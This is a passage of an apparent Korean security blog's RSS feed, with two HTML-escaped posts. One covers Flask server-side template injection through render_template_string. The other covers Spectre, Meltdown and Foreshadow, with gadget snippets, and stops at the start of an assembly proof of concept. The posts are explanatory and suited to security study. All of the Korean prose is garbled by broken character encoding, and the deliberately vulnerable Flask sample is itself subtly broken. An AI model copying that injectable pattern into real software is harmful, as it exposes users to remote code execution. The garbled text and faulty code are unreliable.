   &lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0.0.0.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8080&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;2-rendering&quot;&gt;2. Rendering&lt;/h1&gt;

&lt;p&gt;ë Œë”ë§ ë°©ë²• ì¤‘ì—ì„œ ì·¨ì•½í•œ í•¨ìˆ˜ë¥¼ ì·¨ì•½í•œ ë°©ë²•ìœ¼ë¡œ ì‚¬ìš©í•˜ê²Œ ë  ì‹œ ë°œìƒí•˜ëŠ” ì·¨ì•½ì ì´ ìˆìŠµë‹ˆë‹¤. ì·¨ì•½í•œ ë Œë”ë§ í•¨ìˆ˜ëŠ” render_template_string í•¨ìˆ˜ê°€ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#/app/main/__init__.py
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;flask&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_app&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;flask&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Blueprint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;render_template_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Blueprint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;main&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/search'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;methods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'GET'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'POST'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'POST'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;keyword&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;keyword&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SELECT * FROM user WHERE keyword &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\
&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;                             LIKE '%%(keyword)s%'&quot;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;keyword&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keyword&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

       &lt;span class=&quot;c1&quot;&gt;# jinja2 template with keyword
&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;{% extends /main/search_tables.html %}
                  {% block search %}
                  search : %(keyword)s
                  {% endblock %}&quot;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;keyword&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keyword&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

       &lt;span class=&quot;c1&quot;&gt;# Render Template String
&lt;/span&gt;       &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;render_template_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# if method is GET
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/main/search.html&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìœ„ì™€ ê°™ì´ render_template_string í•¨ìˆ˜ì— ì´ìš©ìê°€ ì…ë ¥í•œ ê°’ì´ ë“¤ì–´ê°€ê²Œ ë˜ë©´, ê°ë³„íˆ ì£¼ì˜í•´ì•¼ í•©ë‹ˆë‹¤. keyword ë¼ëŠ” ê°’ì— ì ì ˆí•œ í•„í„°ë§ì´ ì´ë£¨ì–´ì§€ì§€ ì•Šìœ¼ë©´ SSTI(Server Side Template Injection)ì·¨ì•½ì ì´ ë°œìƒí•˜ê²Œ ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;SSTI ì·¨ì•½ì ì€ RCE(Remote Command Execution) ì·¨ì•½ì ì„ ìœ ë°œí•  ìˆ˜ ìˆëŠ” ë§¤ìš° ìœ„í—˜í•œ ì·¨ì•½ì ìœ¼ë¡œ í•´ë‹¹ ì·¨ì•½ì ì´ ë°œìƒí•˜ì§€ ì•Šë„ë¡ render_template_stringì„ ì‚¬ìš©í•˜ì§€ ì•Šê±°ë‚˜ í•´ë‹¹ í•¨ìˆ˜ì— ì´ìš©ìì˜ ì…ë ¥ ê°’ì´ ë“¤ì–´ê°€ì§€ ì•Šë„ë¡ í•©ë‹ˆë‹¤. ë§Œì•½ ë¶€ë“ì´í•˜ê²Œ render_template_string í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•´ì•¼ í•œë‹¤ë©´, ë¬¸ìì—´ì— ëŒ€í•œ í•„í„°ë§ì´ ë°˜ë“œì‹œ ì´ë£¨ì–´ì ¸ì•¼ í•©ë‹ˆë‹¤.&lt;/p&gt;
</description>
        <pubDate>Wed, 01 Jul 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-07-01/Vulnerabilities-of-Flask</link>
        <guid isPermaLink="true">http://localhost:4000/2020-07-01/Vulnerabilities-of-Flask</guid>
        
        <category>programming</category>
        
        
      </item>
    
      <item>
        <title>Transient execution attacks</title>
        <description>&lt;p&gt;ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ì¡°ì§„í˜¸&lt;/p&gt;

&lt;h1 id=&quot;summary&quot;&gt;summary&lt;/h1&gt;

&lt;p&gt;cpuì·¨ì•½ì ì´ meltdownì´í›„ë¡œ ë§ì´ ë°œê²¬ë˜ê³  ìˆë‹¤. ëŒ€ë¶€ë¶„ cache coherenceì™€ ê´€ë ¨ëœ ë¹„ìŠ·í•œ ì‚¬ì´ë“œ ì±„ë„ ì–´íƒì´ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/jo0700.png&quot; alt=&quot;/assets/jo0700.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;í•´ë‹¹ ì·¨ì•½ì ì´ ë°œí‘œë˜ê³  ì´ë ‡ê²Œ ë§ì´ ì°¾ëŠ” ì´ìœ ëŠ” íŒŒê¸‰ë„ ë•Œë¬¸ì¼ ê²ƒì´ë‹¤. ì»´í“¨í„°ì˜ ê°€ì¥ ë‚®ì€ ë‹¨ê³„ì—ì„œ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•˜ëŠ” ë°©ë²•ì— ìˆëŠ” ì·¨ì•½ì ì´ê¸° ë•Œë¬¸ì— ì»¤ë„ì´ ìˆë“  ì‰ë„ìš° ìŠ¤íƒì´ ìˆë“  ë³´í˜¸ê¸°ë²•ì´ ê±¸ë ¤ìˆë“  ëª¨ë‘ ìš°íšŒí•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì´ë‹¤.&lt;/p&gt;

&lt;p&gt;ë’¤ì— ë‚˜ì˜¬ ëŒ€ë¶€ë¶„ì˜ ê°œë…, ì„¤ëª…, ê·¸ë¦¼ì€ Intel ë©”ë‰´ì–¼ì—ì„œ ê°€ì ¸ì™”ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://software.intel.com/content/www/us/en/develop/download/intel-64-and-ia-32-architectures-optimization-reference-manual.html&quot;&gt;IntelÂ® 64 and IA-32 Architectures Optimization Reference Manual&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;meltdown-spectre&quot;&gt;meltdown, spectre&lt;/h1&gt;

&lt;p&gt;cpuë¶„ì•¼ì˜ ì²«ë²ˆì§¸ ì·¨ì•½ì ì´ë¼ëŠ” ì ì—ì„œ ê´€ì‹¬ì„ ë§ì´ ë°›ì•˜ë˜ ì·¨ì•½ì ì´ë‹¤. ìœ ëª…í•˜ë‹ˆ ì„¤ëª…ì„ ê°„ëµí•˜ê²Œ í•˜ìë©´ cpuëŠ” ì—¬ëŸ¬ê°œì˜ ì½”ì–´ë¥¼ ì‚¬ìš©í•´ ì»´í“¨í„°ì˜ ì†ë„ë¥¼ ëŠ˜ë¦¬ëŠ”ë° ì´ë•Œ ì—¬ëŸ¬ê°œì˜ íŒŒì´í”„ë¼ì¸ì„ ë‘ê³  ì—¬ëŸ¬ ëª…ë ¹ì„ ë™ì‹œì²˜ë¦¬í•˜ë©° ì†ë„ë¥¼ í–¥ìƒì‹œí‚¨ë‹¤. ê°™ì€ í´ëŸ­ì´ë¼ë©´ ì„±ëŠ¥ì´ ê¸°í•˜ê¸‰ìˆ˜ì ìœ¼ë¡œ ì¦ê°€í•œë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/jo0701.png&quot; alt=&quot;/assets/jo0701.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ìœ„ ê·¸ë¦¼ì€ Intel core microarchitecureì¸ë° ë§¨ìœ„ë¶€í„° instructionì„ ê°€ì ¸ì˜¤ê³  instruction queueì— ë„£ê³  decodeí•˜ê³  ìµœì í™”ë¥¼ í•˜ì—¬ Rename/Allocì„ í•˜ê²Œ ë˜ëŠ”ë° ì´ ê³¼ì •ë“¤ì´ ìˆëŠ” ê³³ì„ &lt;strong&gt;front end&lt;/strong&gt;ë¼ê³  ë¶€ë¥¸ë‹¤.&lt;/p&gt;

&lt;p&gt;ì—¬ê¸°ë¶€í„° ë°‘ì— ì¼ë¶€ê°€ &lt;strong&gt;execution core&lt;/strong&gt;ì¸ë° ì‹¤ì œ ëª…ë ¹ì„ ì‹¤í–‰í•˜ëŠ” ì½”ì–´ì— í•´ë‹¹í•˜ëŠ” ê²ƒìœ¼ë¡œ ì‚¬ì´ë“œ ì±„ë„ ì·¨ì•½ì ì´ë¼ê³  í•˜ë‹ˆ ì´ &lt;strong&gt;execution core&lt;/strong&gt;ë¥¼ ì˜ëª»ì‹¤í–‰ë˜ê²Œ í–ˆë‹¤ëŠ” ê²ƒì„ ì˜ˆìƒí•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì‹¤ì œ ì·¨ì•½ì ì€ cacheë¥¼ ì´ìš©í•œ ì·¨ì•½ì ì´ì˜€ê³ , ë¶„ê¸°ì˜ˆì¸¡ì‹œ ë‹¤ìŒ ì½”ë“œë¥¼ ë¯¸ë¦¬ ì‹¤í–‰í•˜ì—¬ ê°’ì´ cacheì— ë“¤ì–´ê°”ë‹¤ëŠ” ê°€ì •í•˜ì— ê°’ì„ ì˜¤í”„ì…‹ìœ¼ë¡œ í•˜ëŠ” ë©”ëª¨ë¦¬ ì˜ì—­ì— ì ‘ê·¼í•˜ì—¬ ì‹œê°„ì„ ì¸¡ì •í•œë‹¤.&lt;/p&gt;

&lt;p&gt;ë¶„ê¸° ì˜ˆì¸¡ì— branch history tableê´€ë ¨ì´ë‚˜ cache block sizeê°™ì€ê±´ ì œì™¸í•˜ê³  í•µì‹¬ ì½”ë“œë§Œ ê°„ë‹¨í•˜ê²Œ ì„¤ëª…í•˜ë©´ ì•„ë˜ ì½”ë“œì™€ ê°™ë‹¤. ì½”ë“œë“¤ì€ google projectzeroì—ì„œ ê°€ì ¸ì™”ë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
 &lt;span class=&quot;nx&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;nx&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;arr1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;untrusted_offset_from_caller&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;untrusted_offset_from_caller&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;untrusted_offset_from_caller&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;untrusted_offset_from_caller&lt;/code&gt;ê°€ 0x200ë³´ë‹¤ ì‘ìœ¼ë©´ í•­ìƒ ì°¸ì´ë˜ë¯€ë¡œ ë¶„ê¸°ì˜ˆì¸¡ì‹œ ê·¸ë™ì•ˆì˜ ê¸°ë¡ì„ ì°¸ê³ í•˜ëŠ”ë° ê·¸ë™ì•ˆ &lt;code class=&quot;highlighter-rouge&quot;&gt;arr1-&amp;gt;length&lt;/code&gt;ë³´ë‹¤ ë‚®ì€ ì£¼ì†Œë¥¼ ë§ì´ ë³´ë‚´ í•™ìŠµì‹œí‚¨ ë’¤, 0x200ë³´ë‹¤ í° ê°’ì„ ì£¼ë©´ ì—¬ì „íˆ ë¶„ê¸° ì˜ˆì¸¡ìœ¼ë¡œ ì¡°ê±´ë¬¸ ì•ˆì˜ ë‚´ìš©ì„ ì‹¤í–‰í•œë‹¤. ì‹¤í–‰í•˜ë©° L1 data cacheì— ë“¤ì–´ê°€ë¯€ë¡œ ì‚¬ì´ë“œ ì±„ë„ ê³µê²©ìœ¼ë¡œ ë©”ëª¨ë¦¬ì— ì ‘ê·¼í•˜ëŠ” ì‹œê°„ì„ ì¸¡ì •í•˜ì—¬ &lt;code class=&quot;highlighter-rouge&quot;&gt;arr1-&amp;gt;data&lt;/code&gt;ì˜ 0x200ì´ ë„˜ëŠ” ì˜ì—­ì— ëŒ€í•œ ë°ì´í„°ë¥¼ ì½ì„ ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì´ëŠ” ë¶„ê¸°ì˜ˆì¸¡ì„ ì´ìš©í•œ íŠ¸ë¦¬ê±°ë¡œ spectreì— í•´ë‹¹í•œë‹¤. meltdownì€ ë¹„ìˆœì°¨ ì‹¤í–‰ì„ ì´ìš©í•œ ê²ƒì´ë‹¤. ìœ„ ì˜ˆì‹œë¥¼ meltdownì˜ ìœ í˜•ì˜ ì½”ë“œë¡œ ë¹„ìŠ·í•˜ê²Œ ë°”ê¿”ë³´ìë©´&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
 &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arr1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;untrusted_offset_from_caller&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;raise_exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arr1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;untrusted_offset_from_caller&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ë¶„ê¸°ë¥¼ ì—†ì• ê³  &lt;code class=&quot;highlighter-rouge&quot;&gt;raise_exception();&lt;/code&gt;ìœ¼ë¡œ ì—ëŸ¬ë¥¼ ë°œìƒì‹œí‚¨ë‹¤. ì´ ì—ëŸ¬ë¥¼ ì²˜ë¦¬í•˜ê¸° ìœ„í•œ signal handlerëŠ” ë”°ë¡œ ë§Œë“¤ì–´ ë‘”ë‹¤. ì›ë˜ë¼ë©´ &lt;code class=&quot;highlighter-rouge&quot;&gt;raise_exception();&lt;/code&gt; ë’¤ì˜ ì½”ë“œê°€ ì‹¤í–‰ë˜ì§€ ì•Šì•„ì•¼ í•˜ë‚˜ ë¹„ìˆœì°¨ ì‹¤í–‰ìœ¼ë¡œ ì‹¤í–‰ì´ ë˜ì–´ cpu coreì˜ L1 cacheì— ë“¤ì–´ê°€ê²Œ ëœë‹¤. ê°’ì„ êµ¬í•˜ëŠ”ê±´ ë§ˆì°¬ê°€ì§€ë¡œ ì ‘ê·¼í•˜ëŠ”ë° ê±¸ë¦¬ëŠ” ì‹œì‘ìœ¼ë¡œ ì¸¡ì •í•œë‹¤.&lt;/p&gt;

&lt;p&gt;ì´ëŸ°ëŠë‚Œì˜ ì·¨ì•½ì ì´ meltdown, spectreë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;foreshadow&quot;&gt;Foreshadow&lt;/h1&gt;

&lt;p&gt;ForeshadowëŠ” meltdownê³¼ ê°™ì€ ìœ í˜•ì˜ ê³µê²©ì´ê³  í˜ì´ì§•ì„ ì´ìš©í•œ ê³µê²©ì´ë‹¤. L1 Terminal Fault ê³µê²©ì´ë¼ê³ ë„ í•˜ëŠ” ì´ ê³µê²©ì€ meltdownì´ supervisor bitë¥¼ ìˆ˜ì •í•˜ì§€ ì•Šê³  kernelë©”ëª¨ë¦¬ë¥¼ ì½ë“¯ì´ present bitë¥¼ ìˆ˜ì •í•˜ì§€ ì•Šê³  SGXë©”ëª¨ë¦¬ë¥¼ ì½ëŠ” ë°©ë²•ì´ë‹¤.&lt;/p&gt;

&lt;p&gt;SGX enclaveë¼ê³  í•˜ëŠ” ê³ ìœ ì˜ ë³´í˜¸ëœ ë©”ëª¨ë¦¬ë¥¼ ì„¤ì •í•˜ê³  ì‚¬ìš©í•˜ê²Œ ë˜ëŠ”ë° ì´ ì˜ì—­ì„ ê°•ì œë¡œ ì ‘ê·¼í•˜ë ¤ í•  ì‹œ ì¼ë°˜ì ì¸ page faultê°€ ì•„ë‹Œ page abortë¥¼ ë°˜í™˜í•œë‹¤.&lt;/p&gt;

&lt;p&gt;ê°€ìƒë©”ëª¨ë¦¬ì˜ ì£¼ì†Œë¥¼ micro architectureê°€ ì½ì„ ë•Œ ê²€ì‚¬í•˜ëŠ” ê³¼ì •ì´ í•´ë‹¹ ë¬¼ë¦¬ ì£¼ì†Œê°€ ìˆëŠ”ì§€, EPTì ìš©í• ì§€ ê²€ì‚¬í•˜ì—¬ ìœ íš¨í•˜ì§€ ì•Šë‹¤ë©´ page faultë¥¼ ë°˜í™˜í•˜ê³  ë‹¤ìŒìœ¼ë¡œ SGXë©”ëª¨ë¦¬ì¸ì§€ ê²€ì‚¬í•˜ì—¬ ê¶Œí•œ(present bit)ì´ ì—†ë‹¤ë©´ page abortë¥¼ ë°˜í™˜í•œë‹¤. ì—¬ê¸°ì„œ ë¹„ìˆœì°¨ ì‹¤í–‰ ì·¨ì•½ì ìœ¼ë¡œ SGXë©”ëª¨ë¦¬ë¥¼ ì½ìœ¼ë ¤ê³  í•  ì‹œ page abortë¥¼ ë°˜í™˜í•˜ë¯€ë¡œ meltdownìœ¼ë¡œ ì ‘ê·¼ì´ ë¶ˆê°€ëŠ¥í•˜ë‹¤. ì—¬ê¸°ì„œ ì‚¬ìš©í•œ instructionì´ ìºì‹œë¥¼ ë¹„ìš°ëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;clflush&lt;/code&gt;ì´ë‹¤.&lt;/p&gt;

&lt;p&gt;ì•„ë˜ ì½”ë“œëŠ” pocì¤‘ì—ì„œ ë©”ëª¨ë¦¬ì— ì ‘ê·¼í•˜ëŠ” ì½”ë“œì¸ë° meltdownê³¼ ìœ ì‚¬í•˜ê²Œ ì‚¬ìš©í•¨ì„ ì•Œ ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;do_access&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;do_access&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
